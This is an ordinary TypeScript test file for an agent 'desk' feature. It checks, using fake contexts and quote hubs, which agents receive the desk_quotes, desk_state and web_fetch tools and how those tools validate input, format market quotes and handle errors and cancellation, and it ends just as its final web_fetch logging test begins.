// face/tests/desk-tools.test.ts
/** The desk's two tools (src/desk-tools.ts), offline: which agents get them, what they answer, and how
 * `installDesk` carries them. Every root context, agent and hub here is a fake - the registration's own
 * contract is what is under test: one root `agent/created` listener that never throws, and one sweep of
 * the agents already live, registering both tools into a `gravit-desk` agent's own tool layer once. That
 * a real tree shows them to the desk's sessions and to nobody else's is the smokes' to prove. */
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DESK_PRESET } from "../src/desk-preset.ts";
import { appendEvent, installDesk, readEvents, type DeskEvent, type DeskRun, type DeskStatus } from "../src/desk.ts";
import {
  DESK_FETCH_URL_MAX, deskToolDefinitions, installDeskGuard, installDeskTools,
  type DeskAgentLike, type DeskGuardCtxLike, type DeskGuardExecution, type DeskToolDefinition,
} from "../src/desk-tools.ts";
import { HttpError } from "../src/http.ts";
import type { MarketQuote as LiveQuote, MarketQuoteIdentity as QuoteIdentity, MarketQuotePayload as QuotePayload } from "../src/market-quotes.ts";
import { NO_QUOTES, unwiredMarketQuotes } from "../src/market-quotes.ts";
import { recorder } from "./route-recorder.ts";

type Listener = (event: { agent: DeskAgentLike }) => undefined;
/** A `tools/pre-execute` or `tools/execute` listener as the fake root holds one. */
type Waterfall = (exec: DeskGuardExecution, next: () => Promise<unknown>) => Promise<unknown>;

/** A root context with the event the desk tools listen to, the live agents `live`, and a preset registry
 * that reads a fake agent's preset off its context. `presetError` makes the registry throw and `listError`
 * the agent listing. `calls` records `on("agent/created")` and `list` in the order they came; `create` plays
 * one agent's creation through every listener and hands back what each answered. The desk guard, which
 * `installDesk` installs beside the tools, lands apart - its `tools/pre-execute` listener in `guards`, its
 * backstop's `tools.guard`, armed through `inject`, in `backstops`, its fetch record's `tools/execute` listener in
 * `executes` - and tests/desk-guard.test.ts drives it. {@link dispatch} plays one call through all three as dsh does. */
function fakeRoot(options: { presetError?: Error; listError?: Error; live?: DeskAgentLike[] } = {}) {
  const listeners: Listener[] = [];
  const guards: Waterfall[] = [];
  const backstops: ((exec: DeskGuardExecution) => string | undefined)[] = [];
  const executes: Waterfall[] = [];
  const calls: string[] = [];
  const ctx: DeskGuardCtxLike = {
    on(name: string, listener: (...args: never[]) => unknown) {
      const list: unknown[] = name === "tools/pre-execute" ? guards : name === "tools/execute" ? executes : listeners;
      if (name !== "tools/pre-execute" && name !== "tools/execute") {
        calls.push("on");
        assert.equal(name, "agent/created");
      }
      list.push(listener);
      return () => {
        const at = list.indexOf(listener);
        if (at >= 0) list.splice(at, 1);
        return at >= 0;
      };
    },
    inject(_deps, callback) {
      const owned: ((exec: DeskGuardExecution) => string | undefined)[] = [];
      callback({ get: () => ({ guard: (check: (exec: DeskGuardExecution) => string | undefined) => { backstops.push(check); owned.push(check); return () => {}; } }) });
      return {
        dispose: async () => {
          for (const check of owned.splice(0)) backstops.splice(backstops.indexOf(check), 1);
        },
      };
    },
    agents: {
      list() {
        calls.push("list");
        if (options.listError !== undefined) throw options.listError;
        return options.live ?? [];
      },
    },
    agentPresets: {
      composedPreset(agentCtx) {
        if (options.presetError !== undefined) throw options.presetError;
        return (agentCtx as { preset?: string }).preset;
      },
    },
  };
  return {
    ctx, listeners, guards, backstops, executes, calls,
    create: (agent: DeskAgentLike): unknown[] => listeners.map((listener) => listener({ agent })),
  };
}

/** One call through the fake root as dsh's registry runs it: the `tools/pre-execute` waterfall (an `allow` when every
 * listener hands on), then the guards - only on an allowed call - and, only when both let it go, the `tools/execute`
 * waterfall around the tool's body. `ran` says whether the body was reached. */
async function dispatch(root: ReturnType<typeof fakeRoot>, exec: DeskGuardExecution): Promise<{ decision: unknown; ran: boolean }> {
  const pre = [...root.guards];
  const decide = (at: number): Promise<unknown> => at < pre.length ? pre[at](exec, () => decide(at + 1)) : Promise.resolve({ kind: "allow" });
  const decision = await decide(0);
  if ((decision as { kind?: unknown }).kind !== "allow") return { decision, ran: false };
  for (const check of root.backstops) {
    const reason = check(exec);
    if (reason !== undefined) return { decision: { kind: "deny", reason }, ran: false };
  }
  let ran = false;
  const around = [...root.executes];
  const run = (at: number): Promise<unknown> => at < around.length ? around[at](exec, () => run(at + 1)) : Promise.resolve((ran = true, { ok: true }));
  await run(0);
  return { decision, ran };
}

/** A call of `name` from an agent on `preset`, its session `sessionId` in the journal. */
function callFrom(preset: string, name: string, args: unknown, sessionId = "desk-session-1"): DeskGuardExecution {
  return {
    name, arguments: args,
    agent: { id: `agent-${sessionId}`, ctx: { preset }, session: { header: { id: sessionId, cwd: "/repo/desk/journal", agentPreset: preset } } },
  };
}

/** An agent joined to `preset` (none when `undefined`), whose own tool layer records what is registered in it - the
 * desk tools, and `web_fetch`, which reaches it through a child plugin `inject`ing `web` (the agent's own context
 * reaches `tools` and `systemPrompt` but not `web`): `injected` records each such plugin's dependencies,
 * `sections` the prompt sections registered through it, and `fetched` the URLs its `web` was asked for. */
function fakeAgent(id: string, preset: string | undefined) {
  const registered: DeskToolDefinition[] = [];
  const injected: string[][] = [];
  const sections: string[] = [];
  const fetched: string[] = [];
  const tools = {
    register(definition: DeskToolDefinition) { registered.push(definition); return () => {}; },
    get: (name: string) => registered.find((definition) => definition.name === name),
  };
  const web = {
    async fetch(request: { url: string }) {
      fetched.push(request.url);
      return { url: request.url, statusCode: 200, body: { kind: "text", content: "a page" }, truncated: false };
    },
  };
  const agent = {
    id,
    ctx: {
      preset,
      tools,
      inject(deps: ["web"], callback: (layer: never) => void) {
        injected.push(deps);
        const layer = {
          tools, web,
          systemPrompt: { section(section: { name: string }) { sections.push(section.name); return () => {}; }, getSectionOrder: () => 0 },
        };
        callback(layer as never);
        return { dispose: async () => {} };
      },
    },
  };
  return { agent, registered, injected, sections, fetched, names: () => registered.map((definition) => definition.name) };
}

/** A hub whose snapshot answers `quotes`, recording every asset list it is asked for. */
function fakeHub(quotes: LiveQuote[] = []) {
  const asked: QuoteIdentity[][] = [];
  const hub = {
    async snapshot(assets: QuoteIdentity[]): Promise<QuotePayload> {
      asked.push(assets);
      return { ok: true, generated_at: "2026-10-20T19:21:04.000Z", quotes, providers: [] };
    },
  };
  return { hub, asked };
}

/** The hub's quote for NVDA as its payload carries one: every field set, and a UI message the tool leaves out. */
const NVDA: LiveQuote = {
  id: "us:NVDA", market: "us", symbol: "NVDA", transport: "stream",
  price: 182.31, prev_close: 180.15, change: 2.16, change_pct: 1.199, volume: 1_204_331,
  as_of: "2026-10-20T19:21:03.123456789Z", received_at: "2026-10-20T19:21:03.200Z", volume_as_of: "2026-10-20T19:21:00Z",
  source: "Alpaca", feed: "iex", basis: "previous_close", quote_status: "live", market_status: "open",
  message: "最近成交时间较早，请留意行情时间。",
};

const STATUS: DeskStatus = {
  ok: true, pid: 4242, version: "0.2.0-rc.2", bootedAt: "2026-10-20T13:00:00.000Z", uptimeMs: 3_600_000,
  desk: { enabled: true, dir: "/home/face/desk" }, asleep: [], runs: [],
  turnsToday: { count: 0, usage: { uncachedInputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheWriteTokens: 0 } },
};

const readStatus = async (): Promise<DeskStatus> => STATUS;

/** A call's run context: only its cancellation, which is all the desk tools read. */
const exec = (signal: AbortSignal = new AbortController().signal) => ({ signal });

function byName(definitions: readonly DeskToolDefinition[], name: string): DeskToolDefinition {
  const found = definitions.find((definition) => definition.name === name);
  assert.ok(found, `no ${name} among ${definitions.map((definition) => definition.name).join(", ")}`);
  return found;
}

test("a gravit-desk agent gets both tools once; a Gravit agent gets none", () => {
  const root = fakeRoot();
  const definitions = deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus });
  const dispose = installDeskTools(root.ctx, definitions);
  assert.equal(root.listeners.length, 1, "one root agent/created listener");

  const desk = fakeAgent("desk-1", DESK_PRESET);
  assert.deepEqual(root.create(desk.agent), [undefined], "the listener answers undefined: nothing for the serial dispatch to wait on");
  root.create(desk.agent);
  assert.deepEqual(desk.names(), ["desk_quotes", "desk_state", "web_fetch"], "both tools, into the agent's own layer, exactly once");
  assert.deepEqual(desk.registered.slice(0, 2), definitions, "the definitions themselves, then dsh's own web_fetch");

  const gravit = fakeAgent("gravit-1", "gravit");
  const bare = fakeAgent("bare-1", undefined);
  root.create(gravit.agent);
  root.create(bare.agent);
  assert.deepEqual(gravit.names(), [], "Gravit's agents never get them");
  assert.deepEqual(bare.names(), [], "nor does an agent joined to no preset");

  dispose();
  assert.equal(root.listeners.length, 0, "the disposer removes the listener");
  const later = fakeAgent("desk-2", DESK_PRESET);
  root.create(later.agent);
  assert.deepEqual(later.names(), [], "and a desk agent created after it gets nothing");
});

/* bootFace serves unary `/api` - `session/create` among it - before main.ts reaches `installDesk`, so a
 * desk agent can be live before the listener exists. */
test("a desk agent live before install gets both tools from the sweep, once; one created after install gets them from the listener", () => {
  const before = fakeAgent("desk-before", DESK_PRESET);
  const gravit = fakeAgent("gravit-before", "gravit");
  const composing = fakeAgent("desk-composing", undefined);
  const root = fakeRoot({ live: [before.agent, gravit.agent, composing.agent] });
  installDeskTools(root.ctx, deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }));
  assert.deepEqual(root.calls, ["on", "list"], "the listener first, then the sweep, in the same tick: no agent falls between them");
  assert.deepEqual(before.names(), ["desk_quotes", "desk_state", "web_fetch"], "a desk agent already live is swept");
  assert.deepEqual(gravit.names(), [], "a Gravit agent is not");
  assert.deepEqual(composing.names(), [], "nor one whose preset is not mounted yet");

  root.create(before.agent);
  assert.deepEqual(before.names(), ["desk_quotes", "desk_state", "web_fetch"], "its creation landing after the sweep adds nothing: exactly once");
  composing.agent.ctx.preset = DESK_PRESET;
  root.create(composing.agent);
  assert.deepEqual(composing.names(), ["desk_quotes", "desk_state", "web_fetch"], "the listener equips it once its creation is announced");
  const after = fakeAgent("desk-after", DESK_PRESET);
  root.create(after.agent);
  assert.deepEqual(after.names(), ["desk_quotes", "desk_state", "web_fetch"], "and one created after install gets them from the listener");
});

test("the listener never throws: a failing register is swallowed and logged", () => {
  const root = fakeRoot();
  const lines: string[] = [];
  const log = (line: string): void => void lines.push(line);
  installDeskTools(root.ctx, deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }), { log });
  const broken = {
    id: "desk-broken",
    ctx: {
      preset: DESK_PRESET,
      tools: { register(): never { throw new Error('tool "desk_quotes" is already registered'); } },
      inject: () => assert.fail("nothing is injected once the desk tools failed"),
    },
  };
  assert.deepEqual(root.create(broken), [undefined], "a throw would have failed the agent's creation");
  assert.equal(lines.length, 1);
  assert.match(lines[0], /^gravit-face: .*desk-broken.*tool "desk_quotes" is already registered/);

  /* A preset registry that cannot answer is the same: logged, never thrown. */
  const orphan = fakeRoot({ presetError: new Error("agentPresets is not in the tree") });
  installDeskTools(orphan.ctx, deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }), { log });
  const agent = fakeAgent("desk-orphan", DESK_PRESET);
  assert.deepEqual(orphan.create(agent.agent), [undefined]);
  assert.deepEqual(agent.names(), []);
  assert.equal(lines.length, 2);
  assert.match(lines[1], /^gravit-face: .*desk-orphan.*agentPresets is not in the tree/);

  /* And so is a sweep that cannot list the live agents; the listener stays for what is created after. */
  const blind = fakeRoot({ listError: new Error("agents is not in the tree") });
  assert.doesNotThrow(() => installDeskTools(blind.ctx, deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }), { log }));
  assert.equal(lines.length, 3);
  assert.match(lines[2], /^gravit-face: .*agents is not in the tree/);
  const late = fakeAgent("desk-late", DESK_PRESET);
  blind.create(late.agent);
  assert.deepEqual(late.names(), ["desk_quotes", "desk_state", "web_fetch"]);
});

test("desk_quotes validates, caps at 20, maps the hub's fields and survives 429", async () => {
  const { hub, asked } = fakeHub([NVDA]);
  const quotes = byName(deskToolDefinitions({ quotes: hub, readState: readStatus }), "desk_quotes");
  assert.equal(quotes.timeoutMs, 15_000);

  const refused: [unknown, RegExp][] = [
    [{ symbols: ["nvda"] }, /"nvda"/],
    [{ symbols: ["NVDA", "BRK B"] }, /"BRK B"/],
    [{ symbols: ["ABCDEFGHIJK"] }, /"ABCDEFGHIJK"/],
    [{ symbols: [7] }, /7/],
    [{ symbols: Array.from({ length: 21 }, (_, i) => `S${String.fromCharCode(65 + i)}`) }, /1 to 20/],
    [{ symbols: [] }, /1 to 20/],
    [{ symbols: "NVDA" }, /1 to 20/],
    [{}, /1 to 20/],
    [null, /1 to 20/],
  ];
  for (const [args, why] of refused) await assert.rejects(quotes.execute(args, exec()), why, JSON.stringify(args));
  assert.equal(asked.length, 0, "a refused call never reaches the hub");

  const value = await quotes.execute({ symbols: ["NVDA"] }, exec());
  assert.deepEqual(value, {
    quotes: [{ symbol: "NVDA", price: 182.31, as_of: "2026-10-20T19:21:03.123456789Z", change_pct: 1.199, prev_close: 180.15, feed: "iex", transport: "stream", status: "live", market: "us" }],
  }, "the hub's fields, its quote_status as status, and none of its UI message");
  assert.deepEqual(asked, [[{ id: "us:NVDA", market: "us", symbol: "NVDA" }]]);

  const twenty = ["BRK.B", "BF-B", ...Array.from({ length: 18 }, (_, i) => `S${String.fromCharCode(65 + i)}`)];
  await quotes.execute({ symbols: twenty }, exec());
  assert.deepEqual(asked[1].map((asset) => asset.id), twenty.map((symbol) => `us:${symbol}`), "twenty is the cap, dots and dashes included");
  await quotes.execute({ symbols: ["NVDA", "AAPL", "NVDA"] }, exec());
  assert.deepEqual(asked[2].map((asset) => asset.symbol), ["NVDA", "AAPL"], "a symbol named twice is asked for once");

  const busy = byName(deskToolDefinitions({
    quotes: { async snapshot(): Promise<QuotePayload> { throw new HttpError(429, "行情请求过多，请稍后重试。"); } },
    readState: readStatus,
  }), "desk_quotes");
  const refusal = await busy.execute({ symbols: ["NVDA"] }, exec());
  assert.deepEqual(refusal, { error: "busy: the Market read refused for now; try again shortly" });
  assert.deepEqual(busy.output.render({ symbols: ["NVDA"] }, refusal),
    [{ type: "text", text: "busy: the Market read refused for now; try again shortly" }]);
  const failing = byName(deskToolDefinitions({
    quotes: { async snapshot(): Promise<QuotePayload> { throw new HttpError(503, "quote service stopped"); } },
    readState: readStatus,
  }), "desk_quotes");
  assert.deepEqual(await failing.execute({ symbols: ["NVDA"] }, exec()), { error: "unavailable: quote service stopped" }, "any other failure is unavailable and why");

  assert.deepEqual(quotes.presentCall({ symbols: ["NVDA", "AAPL"] }), { card: "generic", title: "Quotes: NVDA, AAPL", kind: "read" });
  assert.deepEqual(quotes.presentCall("junk"), { card: "generic", title: "Quotes", kind: "read" });
});

test("desk_quotes renders one line per quote, its time as the desk quotes it: the feed, New York's clock, a date when not today", async () => {
  /* 23:00 ET on Tuesday 2026-10-20 (EDT) - already the 21st in UTC. */
  const now = Date.parse("2026-10-21T03:00:00.000Z");
  const quote = (symbol: string, fields: Partial<LiveQuote>): LiveQuote => ({ ...NVDA, id: `us:${symbol}`, symbol, ...fields });
  const { hub } = fakeHub([
    NVDA,
    quote("AAPL", { price: 229.5, prev_close: 230.7, change_pct: -0.52, as_of: "2026-10-19T19:59:59Z", transport: "poll", quote_status: "stale" }),
    quote("MSFT", { price: 410.25, prev_close: null, change_pct: null, as_of: "2026-10-21T02:30:00Z", feed: "delayed_sip", quote_status: "delayed" }),
    quote("ZZZ", { price: null, prev_close: null, change_pct: null, as_of: null, feed: "", transport: "poll", quote_status: "unavailable" }),
  ]);
  const quotes = byName(deskToolDefinitions({ quotes: hub, readState: readStatus, now: () => now }), "desk_quotes");
  const value = await quotes.execute({ symbols: ["NVDA", "AAPL", "MSFT", "ZZZ"] }, exec());
  assert.deepEqual(quotes.output.render({ symbols: ["NVDA", "AAPL", "MSFT", "ZZZ"] }, value), [{
    type: "text",
    text: [
      "NVDA 182.31, +1.20% vs prev close 180.15 | IEX 15:21:03 ET | stream | live",
      "AAPL 229.5, -0.52% vs prev close 230.7 | IEX 2026-10-19 15:59:59 ET | poll | stale",
      "MSFT 410.25 | DELAYED_SIP 22:30:00 ET | stream | delayed",
      "ZZZ no price | poll | unavailable",
    ].join("\n"),
  }], "today is New York's: MSFT's 02:30 UTC on the 21st is 22:30 on the 20th there, and carries no date");
  assert.deepEqual((value as { quotes: { as_of: string | null }[] }).quotes.map((q) => q.as_of),
    ["2026-10-20T19:21:03.123456789Z", "2026-10-19T19:59:59Z", "2026-10-21T02:30:00Z", null], "the value keeps the hub's own times");
});

test("desk_state returns readState(), its runs cut to the last ten and counted in runsInLedger", async () => {
  let reads = 0;
  const runs: DeskRun[] = Array.from({ length: 12 }, (_, i) => ({ bootedAt: `2026-10-${String(i + 1).padStart(2, "0")}T13:00:00.000Z`, pid: 100 + i, lost: false }));
  const status: DeskStatus = { ...STATUS, runs };
  const state = byName(deskToolDefinitions({ quotes: fakeHub().hub, readState: async () => { reads += 1; return status; } }), "desk_state");
  assert.equal(state.timeoutMs, 5_000);
  assert.deepEqual(state.parameters, { type: "object", properties: {}, additionalProperties: false }, "no parameters");
  const value = await state.execute({}, exec());
  assert.deepEqual(value, { ...status, runs: runs.slice(-10), runsInLedger: 12 });
  assert.equal(status.runs.length, 12, "the status read is not cut in place");
  await state.execute({}, exec());
  assert.equal(reads, 2, "read afresh on every call");
  const few = byName(deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }), "desk_state");
  assert.deepEqual(await few.execute({}, exec()), { ...STATUS, runsInLedger: 0 }, "ten or fewer: every one");
  assert.deepEqual(state.output.render({}, value), [{ type: "text", text: JSON.stringify(value) }]);
  assert.deepEqual(state.presentCall({}), { card: "generic", title: "Desk state", kind: "read" });
});

test("desk_state carries the watch's block without its marks: near and recent stay (old ruling 15)", async () => {
  const mark = (symbol: string) => ({ market: "us" as const, symbol, kind: "stop" as const, level: "170", when: "cross_down" as const, plan: "p", file: "desk/levels.yml", distancePct: 1.2 });
  const near = [{ market: "us" as const, symbol: "NVDA", kind: "stop" as const, level: "170", when: "cross_down" as const, last: 172, at: "ROBINHOOD 10:21:03 ET", distancePct: -1.16, plan: "p", file: "desk/levels.yml" }];
  const recent = [{ id: "a-1", t: "2026-11-30T15:21:04.000Z", market: "us" as const, symbol: "NVDA", label: "stop 170", gap: false, price: 169.8, feed: "robinhood", outcome: "sent" as const, latencyMs: 1800 }];
  const today = { sent: 1, suppressed: { cooldown: 0, cap: 0, muted: 0, off: 0, window: 0 }, repeats: 0 };
  const watch: NonNullable<DeskStatus["watch"]> = {
    state: "watching", markets: { us: { state: "polling", watched: 1, notWatched: [], today }, cn: { state: "off", watched: 0, notWatched: [], today } },
    files: [], near, marks: [mark("NVDA"), mark("AAPL"), mark("MSFT")], pending: 0, recent, filings: { state: "off", symbols: 0, aShares: 0, seeded: 0 },
  };
  const status: DeskStatus = { ...STATUS, watch };
  const state = byName(deskToolDefinitions({ quotes: fakeHub().hub, readState: async () => status }), "desk_state");
  const value = await state.execute({}, exec()) as DeskStatus & { watch: Record<string, unknown> };
  assert.ok(!Object.hasOwn(value.watch, "marks"), "no marks key");
  assert.deepEqual(value.watch.near, near);
  assert.deepEqual(value.watch.recent, recent);
  const { marks: _marks, ...rest } = watch;
  assert.deepEqual(value, { ...STATUS, watch: rest, runsInLedger: 0 });
  assert.equal(status.watch?.marks.length, 3, "the status read keeps its marks: the route carries them");
  assert.deepEqual((state.output.schema as { properties: Record<string, unknown> }).properties.watch, { type: "object" });
  assert.deepEqual(await byName(deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }), "desk_state").execute({}, exec()), { ...STATUS, runsInLedger: 0 },
    "no watch, no watch key");
});

test("a cancelled call settles at once, whatever the hub or the ledger is doing", async () => {
  let snapshots = 0;
  const never = new Promise<never>(() => {});
  const definitions = deskToolDefinitions({ quotes: { snapshot: () => { snapshots += 1; return never; } }, readState: () => never });
  const controller = new AbortController();
  const pending = byName(definitions, "desk_quotes").execute({ symbols: ["NVDA"] }, exec(controller.signal));
  controller.abort(new Error("turn cancelled"));
  await assert.rejects(pending, /turn cancelled/);
  assert.equal(snapshots, 1);
  await assert.rejects(byName(definitions, "desk_quotes").execute({ symbols: ["NVDA"] }, exec(AbortSignal.abort(new Error("already cancelled")))), /already cancelled/);
  assert.equal(snapshots, 1, "a call cancelled before it starts never reaches the hub");
  await assert.rejects(byName(definitions, "desk_state").execute({}, exec(AbortSignal.abort(new Error("already cancelled")))), /already cancelled/);
});

/* main.ts's `installFailLoud` turns an unhandled rejection into a process exit: a snapshot that fails
 * after its call gave up must still be consumed. */
test("a hub that fails after its call was cancelled leaves no unhandled rejection", async () => {
  const seen: unknown[] = [];
  const onUnhandled = (reason: unknown): void => void seen.push(reason);
  process.on("unhandledRejection", onUnhandled);
  try {
    let fail!: (error: unknown) => void;
    const late = new Promise<QuotePayload>((_, reject) => { fail = reject; });
    const quotes = byName(deskToolDefinitions({ quotes: { snapshot: () => late }, readState: readStatus }), "desk_quotes");
    const controller = new AbortController();
    const pending = quotes.execute({ symbols: ["NVDA"] }, exec(controller.signal));
    controller.abort(new Error("turn cancelled"));
    await assert.rejects(pending, /turn cancelled/);
    fail(new HttpError(503, "the hub failed after the call was cancelled"));
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.deepEqual(seen, []);
  } finally {
    process.off("unhandledRejection", onUnhandled);
  }
});

test("installDesk installs the desk tools whatever enabled says, desk_state reads what the status route reads, and dispose removes the listener", async (t) => {
  const watch = { setInterval: () => 1, clearInterval: () => {} };
  /* Every home made here is removed after the test; the guard's install line goes to a log that drops it. */
  const homes: string[] = [];
  t.after(() => Promise.all(homes.map((dir) => rm(dir, { recursive: true, force: true }))));
  const freshHome = async (): Promise<string> => {
    const made = await mkdtemp(join(tmpdir(), "face-desk-tools-"));
    homes.push(made);
    return made;
  };
  const quiet = (): void => {};
  for (const enabled of [false, true]) {
    const home = await freshHome();
    /* Twelve runs already in the ledger, so the tool's cut shows. */
    for (let i = 0; i < 12; i++) {
      const pid = 100 + i;
      await appendEvent(home, { t: `2026-10-${String(i + 1).padStart(2, "0")}T13:00:00.000Z`, kind: "boot", pid, version: "v", deskEnabled: true });
      await appendEvent(home, { t: `2026-10-${String(i + 1).padStart(2, "0")}T21:00:00.000Z`, kind: "shutdown", pid, code: 0 });
    }
    const root = fakeRoot();
    const rec = recorder();
    const at = Date.parse("2026-10-20T14:00:00.000Z");
    const desk = installDesk(rec, { home, enabled, now: () => at, version: "v", watch, ctx: root.ctx, quotes: fakeHub().hub, root: "/repo", log: quiet });
    assert.equal(root.listeners.length, 1, `the listener is installed (enabled: ${enabled})`);
    assert.equal(root.guards.length, 1, `and the desk guard beside it (enabled: ${enabled})`);
    assert.equal(root.backstops.length, 1, `with its backstop (enabled: ${enabled})`);
    assert.equal(root.executes.length, 1, `and the fetch record (enabled: ${enabled})`);
    const agent = fakeAgent(`desk-${enabled}`, DESK_PRESET);
    root.create(agent.agent);
    assert.deepEqual(agent.names(), ["desk_quotes", "desk_state", "web_fetch"]);
    await desk.ready;
    const fromTool = await byName(agent.registered, "desk_state").execute({}, exec()) as DeskStatus & { runsInLedger: number };
    const fromRoute = JSON.parse(await rec.call("/data/desk/status")) as { status: number; body: DeskStatus };
    assert.equal(fromRoute.status, 200);
    const { runs: toolRuns, runsInLedger, ...toolRest } = fromTool;
    const { runs: routeRuns, ...routeRest } = fromRoute.body;
    assert.deepEqual(toolRest, routeRest, `the tool and GET /data/desk/status agree on every field but runs (enabled: ${enabled})`);
    assert.equal(routeRuns.length, enabled ? 13 : 12, "the route answers every run");
    assert.deepEqual(toolRuns, routeRuns.slice(-10), "the tool, the route's last ten");
    assert.equal(runsInLedger, routeRuns.length);
    await desk.dispose(0);
    assert.equal(root.listeners.length, 0, `dispose removes the listener (enabled: ${enabled})`);
    assert.equal(root.guards.length, 0, `and the guard (enabled: ${enabled})`);
    assert.equal(root.backstops.length, 0, `and its backstop (enabled: ${enabled})`);
    assert.equal(root.executes.length, 0, `and the fetch record (enabled: ${enabled})`);
  }
  /* The tools need both: a context with no hub installs no tools - only the desk guard, which needs no hub. */
  const root = fakeRoot();
  const guardOnly = installDesk(recorder(), { home: await freshHome(), enabled: false, ctx: root.ctx, root: "/repo", log: quiet });
  assert.equal(root.listeners.length, 0, "no tools without a hub");
  assert.equal(root.guards.length, 1, "but the guard");
  assert.equal(root.backstops.length, 1, "and its backstop");
  await guardOnly.dispose(0);
});

test("desk_quotes over an unwired source answers unavailable and why, asks nothing, and still refuses a bad argument", async () => {
  const quotes = byName(deskToolDefinitions({ quotes: unwiredMarketQuotes(), readState: readStatus }), "desk_quotes");
  const answer = await quotes.execute({ symbols: ["NVDA"] }, exec());
  assert.deepEqual(answer, { error: `unavailable: ${NO_QUOTES}` });
  assert.deepEqual(quotes.output.render({ symbols: ["NVDA"] }, answer), [{ type: "text", text: `unavailable: ${NO_QUOTES}` }]);
  await assert.rejects(quotes.execute({ symbols: ["nvda"] }, exec()));
  assert.match(quotes.description, /the Market's read; when the Account cannot be asked it answers unavailable and why/);
});

/** The Market's quote for 600519 as a payload carries one: Tencent's, in the trading phase. */
const MOUTAI: LiveQuote = {
  id: "cn:600519", market: "cn", symbol: "600519", transport: "poll",
  price: 1452.3, prev_close: 1440.06, change: 12.24, change_pct: 0.85, volume: 31_200,
  as_of: "2026-12-01T06:03:12Z", received_at: "2026-12-01T06:03:13.000Z", volume_as_of: null,
  source: "market", feed: "tencent", basis: "previous_close", quote_status: "live", market_status: "open", message: "",
  cn: { phase: "trading", lastSession: "2026-12-01" },
};

test("desk_quotes asks one snapshot over both markets and answers in the order asked", async () => {
  const ping = { ...MOUTAI, id: "cn:000001", symbol: "000001", price: 11.2, prev_close: 11.1, change_pct: 0.9 };
  let now = Date.parse("2026-12-01T06:03:20Z");
  const { hub, asked } = fakeHub([MOUTAI, NVDA, ping]);
  const quotes = byName(deskToolDefinitions({ quotes: hub, readState: readStatus, now: () => now }), "desk_quotes");
  const value = await quotes.execute({ symbols: ["600519", "NVDA", "000001"] }, exec()) as { quotes: Record<string, unknown>[] };
  assert.deepEqual(asked, [[
    { id: "cn:600519", market: "cn", symbol: "600519" },
    { id: "us:NVDA", market: "us", symbol: "NVDA" },
    { id: "cn:000001", market: "cn", symbol: "000001" },
  ]], "one snapshot; the source splits the markets");
  assert.deepEqual(value.quotes.map((q) => [q.symbol, q.market]), [["600519", "cn"], ["NVDA", "us"], ["000001", "cn"]]);
  assert.equal(value.quotes[0]?.feed, "tencent");
  const lines = (): string[] => (quotes.output.render({}, value)[0]?.text ?? "").split("\n");
  assert.equal(lines()[0], "600519 1452.3, +0.85% vs prev close 1440.06 | TENCENT 14:03:12 Beijing | poll | live");
  now = Date.parse("2026-12-02T02:00:00Z");
  assert.equal(lines()[0], "600519 1452.3, +0.85% vs prev close 1440.06 | TENCENT 2026-12-01 14:03:12 Beijing | poll | live");

  await assert.rejects(quotes.execute({ symbols: ["60051"] }, exec()),
    { message: 'desk_quotes takes US tickers in capitals (NVDA, BRK.B) or six digits for an A share (600519); "60051" is not one' });
  await assert.rejects(quotes.execute({ symbols: [600519] }, exec()), /600519 is not one/, "a number is not a code");
  await assert.rejects(quotes.execute({ symbols: [] }, exec()), { message: "desk_quotes takes symbols: 1 to 20 US tickers or six-digit A shares" });
  assert.equal((quotes.parameters as { properties: { symbols: { items: { pattern: string } } } }).properties.symbols.items.pattern,
    "^[A-Z][A-Z0-9.-]{0,9}$|^\\d{6}$");
  assert.match(quotes.description, /A shares/);
});

test("desk_quotes' output schema requires market", () => {
  const quotes = byName(deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }), "desk_quotes");
  const items = (quotes.output.schema as { oneOf: { properties: { quotes: { items: { properties: Record<string, unknown>; required: string[] } } } }[] })
    .oneOf[0]!.properties.quotes.items;
  assert.deepEqual(items.properties.market, { type: "string", enum: ["us", "cn"] });
  assert.ok(items.required.includes("market"));
});

test("desk_quotes on an unwired source answers NO_QUOTES for every symbol", async () => {
  const quotes = byName(deskToolDefinitions({ quotes: unwiredMarketQuotes(), readState: readStatus }), "desk_quotes");
  assert.deepEqual(await quotes.execute({ symbols: ["600519", "NVDA"] }, exec()),
    { error: "unavailable: no quote source is wired: this face has no Market read to ask" });
});

/* ---------- web_fetch: the desk's alone, and on the record (spec 2026-11-07 §5.6, charter R1 and D29) ---------- */

test("a desk agent's own layer offers web_fetch beside desk_quotes and desk_state; another agent's offers none of them", async () => {
  const root = fakeRoot();
  installDeskTools(root.ctx, deskToolDefinitions({ quotes: fakeHub().hub, readState: readStatus }));
  const desk = fakeAgent("desk-1", DESK_PRESET);
  root.create(desk.agent);
  assert.deepEqual(desk.names(), ["desk_quotes", "desk_state", "web_fetch"], "dsh's own web_fetch, in the agent's own layer");
  assert.deepEqual(desk.injected, [["web"]], "through one child plugin that injects web");
  assert.deepEqual(desk.sections, ["tool:web_fetch"], "with its prompt section, in the same layer");
  const fetch = byName(desk.registered, "web_fetch");
  const value = await fetch.execute({ url: "https://www.nasdaq.com/articles/intc" }, exec());
  assert.deepEqual(desk.fetched, ["https://www.nasdaq.com/articles/intc"], "it fetches through the web service the plugin injected");
  assert.deepEqual(value, { url: "https://www.nasdaq.com/articles/intc", statusCode: 200, body: { kind: "text", content: "a page" }, truncated: false });

  for (const [id, preset] of [["gravit-1", "gravit"], ["bot-1", "bot-news-scout"], ["bare-1", undefined]] as const) {
    const other = fakeAgent(id, preset);
    root.create(other.agent);
    assert.deepEqual(other.names(), [], `${id} gets none of them`);
    assert.deepEqual(other.injected, [], `${id}: nothing is injected`);
  }
});

test("each web_fetch a desk agent makes is one desk-fetch line, its URL as asked, cut at 2,000 characters", async (t) => {
  const home = await mkdtemp(join(tmpdir(), "face-desk-fetch-"));
  t.after(() => rm(home, { recursive: true, force: true }));
  const root = fakeRoot();
